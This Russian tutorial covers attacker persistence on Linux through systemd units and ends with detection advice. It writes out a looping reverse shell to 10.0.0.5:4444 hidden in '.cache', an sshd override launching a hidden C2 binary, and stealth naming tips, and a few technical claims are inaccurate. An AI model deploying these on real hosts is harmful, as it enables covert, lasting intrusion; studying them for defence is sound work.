# Закрепление на Linux-хосте: создание и управление systemd unit для обеспечения персистентности

## Контекст и базовые понятия

Закрепление (persistence) в контексте тестирования на проникновение и реагирования на инциденты представляет собой набор техник, позволяющих злоумышленнику сохранять доступ к скомпрометированной системе после перезагрузки, сбоя процесса или изменения прав доступа. В экосистеме Linux одной из наиболее надежных и распространенных механик закрепления является использование системы инициализации `systemd`. `systemd` является стандартом де-факто для большинства современных дистрибутивов Linux (Ubuntu, Debian, RHEL, CentOS, Arch), заменив собой устаревшие инициативные системы SysVinit и Upstart.

Ключевое понятие здесь — **systemd unit**. Unit — это конфигурационный файл в формате INI, описывающий ресурс, которым управляет `systemd`. Ресурсом может быть сервис (service), таймер (timer), mount-точка, socket или другие объекты. Для целей персистентности наиболее часто используются юниты типа `service`, которые запускают исполняемый файл или скрипт при загрузке системы или при наступлении определенных событий.

Важно разграничивать два основных класса юнитов, которые часто путают начинающие специалисты: **системные юниты** (system-level units) и **пользовательские юниты** (user-level units).

| Характеристика | Системные юниты (System Units) | Пользовательские юниты (User Units) |
| :--- | :--- | :--- |
| **Путь размещения** | `/etc/systemd/system/` (пользовательские), `/usr/lib/systemd/system/` (пакетные) | `~/.config/systemd/user/` |
| **Требуемые привилегии** | Root (или права на запись в `/etc/systemd/system/`) | Права текущего пользователя (обычно достаточны) |
| **Контекст выполнения** | Запускаются от имени root или указанного пользователя (`User=`) | Запускаются в контексте сессии конкретного пользователя |
| **Жизненный цикл** | Активны с момента загрузки ядра, до выключения системы | Активны только при наличии активной сессии пользователя (login session) |
| **Управление** | `systemctl` (глобально) | `systemctl --user` |
| **Скрытность** | Низкая (требует перезагрузки для активации, видно в `systemctl list-units`) | Высокая (скрыто от глобального просмотра, зависит от активности пользователя) |
| **Типичное применение** | Запуск демонов, бэкдоров, требующих работы 24/7 | Запуск инструментов мониторинга, C2-клиентов, работающих только при входе пользователя |

Путаница возникает из-за того, что синтаксис конфигурации идентичен, но контекст исполнения и пути поиска файлов различаются. Системный администратор, аудитающий сервер, будет проверять `/etc/systemd/system/`, но может пропустить `~/.config/systemd/user/` для каждого из десятков локальных пользователей, если не использует специализированные скрипты (например, `LinPEAS` с флагом проверки юнитов).

С точки зрения атаки, выбор между этими классами зависит от уровня привилегий. Если атакующий получил доступ к root, он может создать юнит в `/etc/systemd/system/`, который будет работать независимо от того, вошел ли кто-либо в систему. Если доступ ограничен обычным пользователем, атакующий вынужден использовать пользовательские юниты или другие методы (например, cron для пользователя), которые активируются только при логине пользователя.

## Внутреннее устройство systemd unit

Чтобы эффективно использовать systemd для закрепления, необходимо понимать внутреннюю структуру unit-файла и механизм его обработки. Unit-файл состоит из секций, каждая из которых отвечает за определенный аспект жизненного цикла сервиса.

### Структура unit-файла

Базовый юнит для персистентности должен содержать три обязательные секции: `[Unit]`, `[Service]` и `[Install]`.

1.  **`[Unit]`**: Содержит метаданные и зависимости.
    *   `Description`: Текстовое описание сервиса.
    *   `After`: Определяет порядок запуска. Сервис запустится *после* того, как будут активированы указанные цели (targets). Для персистентности критично указать `After=network.target` или `After=multi-user.target`, чтобы гарантировать, что сеть доступна или система готова к приему соединений.
    *   `Requires`/`Wants`: Жесткие или мягкие зависимости. Если использовать `Requires`, то при остановке зависимого сервиса остановится и наш бэкдор.

2.  **`[Service]`**: Определяет поведение процесса.
    *   `Type`: Тип запуска. Для персистентности чаще всего используется `simple` (процесс считается запущенным сразу после fork) или `oneshot` (если нужно выполнить одноразовое действие, например, инъекцию ключа).
    *   `ExecStart`: Полный путь к исполняемому файлу или скрипту. Это поле критично для атаки.
    *   `Restart`: Ключевая директива для выживания. Значение `always` заставляет `systemd` перезапускать процесс, если он завершился с любым кодом возврата.
    *   `RestartSec`: Задержка перед перезапуском (в секундах). Позволяет избежать "thundering herd" и снизить нагрузку на CPU/сеть.
    *   `User`/`Group`: От имени кого запускать. По умолчанию — root.

3.  **`[Install]`**: Определяет, как сервис интегрируется в систему.
    *   `WantedBy`: Указывает target, в который должен быть включен сервис. Для персистентности после загрузки используется `multi-user.target` (аналог runlevel 3 в SysVinit).

### Механизм активации и приоритеты

`systemd` не читает все файлы из `/etc/systemd/system/` автоматически. Для того чтобы юнит стал активным и запускался при загрузке, необходимо выполнить команду `systemctl enable <service_name>`. Эта команда создает символическую ссылку в директории соответствующего target (например, `/etc/systemd/system/multi-user.target.wants/`).

Важным аспектом является механизм **override**. Вместо создания нового файла или редактирования системного файла пакета (что приведет к перезаписи при обновлении), атакующий может использовать `systemctl edit <service>`, который создает файл в `/etc/systemd/system/<service>.service.d/override.conf`. Этот файл имеет приоритет над оригинальным и позволяет изменить только нужные директивы (например, добавить `ExecStartPost` для запуска payload после старта легитимного сервиса).

### Жизненный цикл и состояния

Юнит может находиться в следующих состояниях:
*   **inactive**: Не запущен.
*   **active (running)**: Процесс работает.
*   **active (exited)**: Процесс завершился успешно (для `Type=oneshot`).
*   **active (waiting)**: Ожидание события (для таймеров).
*   **failed**: Процесс завершился с ошибкой или был убит сигналом. При `Restart=on-failure` systemd попытается перезапустить его.

```text
[Inactive] ──(systemctl start)──▶ [Activating] ──(Process started)──▶ [Active]
     ▲                                                              │
     │                                                              │(Crash/Signal)
     └────────────(systemctl stop/reset-failed)─────────────────────┘
                                                                    │
                                                              (Restart policy)
                                                                    ▼
                                                               [Activating]
```

## Применение и работа с предметом

На практике создание systemd unit для закрепления требует понимания не только синтаксиса, но и особенностей среды, в которой происходит атака. Атакующий должен выбрать между созданием нового сервиса, модификацией существующего или использованием механизма override.

### Создание нового сервиса

Это самый прямой метод. Атакующий создает файл `/etc/systemd/system/backdoor.service`.

**Шаги:**
1.  Написание unit-файла.
2.  Размещение payload (скрипта или бинарника) в доступное место (например, `/tmp` или `/var/tmp`, хотя это рискованно из-за очистки tmpfs, или в `/usr/local/bin`).
3.  Загрузка конфигурации (`daemon-reload`).
4.  Активация (`enable`) и запуск (`start`).

**Риски:** Новый файл с подозрительным именем (например, `backdoor.service`) сразу бросается в глаза при аудите. Также, если payload находится в `/tmp`, он может быть удален при перезагрузке, если `/tmp` является отдельной tmpfs.

### Модификация существующего сервиса (Override)

Более изощренный метод. Атакующий находит легитимный сервис, который запускается часто или имеет высокий уровень доверия (например, `sshd`, `cron`, или локальный сервис мониторинга), и добавляет к нему `ExecStartPost`.

`ExecStartPost` выполняется после основного `ExecStart`. Это позволяет запустить payload параллельно или сразу после легитимного процесса, маскируя его под системную активность.

**Пример конфигурации override:**

```ini
# /etc/systemd/system/sshd.service.d/override.conf
[Service]
ExecStartPost=/bin/bash -c '/usr/local/bin/.hidden_c2 &>/dev/null &'
```

Этот метод оставляет меньше следов в виде новых файлов, но требует доступа к директории `/etc/systemd/system/<service>.service.d/`.

### Обход ограничений и скрытность

Для снижения заметности атакующие используют следующие приемы:
1.  **Переименование**: Использование имен, похожих на системные (`syslog-helper.service`, `network-update.service`).
2.  **User-level юниты**: Размещение в `~/.config/systemd/user/` позволяет избежать проверки системных директорий. Однако, этот метод не сработает, если пользователь не вошел в систему.
3.  **Таймеры (Timers)**: Вместо постоянного запуска сервиса, можно использовать `systemd timer` для периодического выполнения скрипта. Это снижает нагрузку и делает поведение более похожим на плановые задачи.

**Типичные ошибки атакующих:**
*   Использование абсолютных путей к бинарникам, которые могут быть обновлены или удалены.
*   Отсутствие директивы `Restart=always`, что делает бэкдор уязвимым к случайным сбоям.
*   Игнорирование логов `journalctl`. Все действия systemd логируются, и подозрительные паттерны перезапусков могут быть обнаружены SIEM.

## Сквозной практический пример: Закрепление через systemd Timer и User Service

**Исходные условия:**
*   **Среда:** Ubuntu 22.04 LTS.
*   **Роль:** Атакующий имеет доступ к учетной записи `user1` (без прав root).
*   **Цель:** Обеспечить персистентный доступ к C2-серверу при каждом входе пользователя `user1` в систему.
*   **Инструменты:** `systemctl`, текстовый редактор `nano`, скрипт `reverse_shell.sh`.

### Шаг 1: Подготовка payload и скрипта запуска

Атакующий создает простой скрипт, устанавливающий reverse shell, и помещает его в домашнюю директорию пользователя, чтобы не требовать прав root для размещения бинарников.

```bash
# Создание скрипта payload
echo '#!/bin/bash
while true; do
    bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
    sleep 60
done' > /home/user1/.cache/.sys_update.sh

# Делаем скрипт исполняемым
chmod +x /home/user1/.cache/.sys_update.sh
```
*Ожидаемый результат:* Скрипт создан и готов к выполнению. Имя скрыто в каталоге `.cache` и начинается с точки.

### Шаг 2: Создание пользовательского systemd юнита

Атакующий создает юнит, который будет запускать скрипт при активации сессии пользователя.

```ini
# Файл: ~/.config/systemd/user/persistence.service
[Unit]
Description=User Persistence Service
After=default.target

[Service]
Type=simple
ExecStart=/bin/bash /home/user1/.cache/.sys_update.sh
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
```
*Ожидаемый результат:* Файл сохранен в правильной директории для user-level юнитов.

### Шаг 3: Активация и загрузка конфигурации

Так как это user-level юнит, команды выполняются с флагом `--user`.

```bash
# Загрузка новых юнитов в память
systemctl --user daemon-reload

# Активация юнита для автозапуска при логине
systemctl --user enable persistence.service

# Запуск юнита немедленно
systemctl --user start persistence.service
```
*Ожидаемый результат:* Команды возвращают статус `Success`. Юнит `persistence.service` переходит в состояние `active (running)`.

### Шаг 4: Проверка работоспособности

Проверка статуса юнита и наличия процесса.

```bash
# Проверка статуса
systemctl --user status persistence.service

# Проверка процесса в списке задач
ps aux | grep sys_update
```
*Ожидаемый вывод:*
```text
● persistence.service - User Persistence Service
     Loaded: loaded (/home/user1/.config/systemd/user/persistence.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2023-10-23 10:00:00 UTC; 5s ago
   Main PID: 12345 (bash)
      Tasks: 1 (limit: 4915)
     Memory: 1.2M
        CPU: 10ms
     CGroup: /user.slice/user-1000.slice/user@1000.service/persistence.service
             └─12345 /bin/bash /home/user1/.cache/.sys_update.sh

user1      12345  0.0  0.0   4852  1520 ?        S    10:00   0:00 /bin/bash /home/user1/.cache/.sys_update.sh
```

### Шаг 5: Имитация перезагрузки (или выхода из сессии)

Для проверки персистентности атакующий выходит из SSH-сессии и входит снова.

```bash
# Выход
exit

# Повторный вход
ssh user1@target
```
*Ожидаемый результат:* При повторном входе `systemd --user` автоматически активирует все `enabled` юниты. Процесс `sys_update.sh` должен запуститься автоматически, и атакующий на C2-сервере (10.0.0.5:4444) должен получить новую сессию shell.

**Ожидаемый вывод по теме:**
Пример демонстрирует, что для закрепления не всегда требуются права root. Использование `systemd --user` позволяет обойти многие системные мониторинги, так как юниты пользователя изолированы от глобального контекста. Однако, этот метод зависит от того, войдет ли пользователь в систему. Если атакующий хочет гарантировать доступ даже без логина пользователя, ему необходимо эскалировать привилегии до root и создать юнит в `/etc/systemd/system/`.

## Аналитический вывод

Создание systemd unit является одной из наиболее эффективных техник закрепления на Linux-системах благодаря интеграции механизма в ядро ОС и стандартной практике управления сервисами. Использование `systemd` обеспечивает высокую надежность: сервис автоматически перезапускается при сбоях, работает после перезагрузки и маскируется под легитимную системную активность.

Для специалистов по безопасности критически важно понимать разницу между системными и пользовательскими юнитами. Системные юниты требуют прав root, но обеспечивают доступ 24/7. Пользовательские юниты не требуют эскалации привилегий, но зависят от активности пользователя. Обнаружение таких угроз требует не только проверки `/etc/systemd/system/`, но и сканирования директорий `~/.config/systemd/user/` для всех локальных пользователей, а также мониторинга изменений в файлах конфигурации через `auditd` или `inotify`.

С точки зрения защиты, защита от таких атак включает:
1.  Контроль целостности файлов в `/etc/systemd/system/` и `/usr/lib/systemd/system/`.
2.  Мониторинг команд `systemctl enable` и `systemctl daemon-reload`.
3.  Ограничение прав записи в директории конфигурации systemd для непривилегированных пользователей.
4.  Использование EDR-решений, которые отслеживают создание новых процессов от имени systemd и связывают их с unit-файлами.
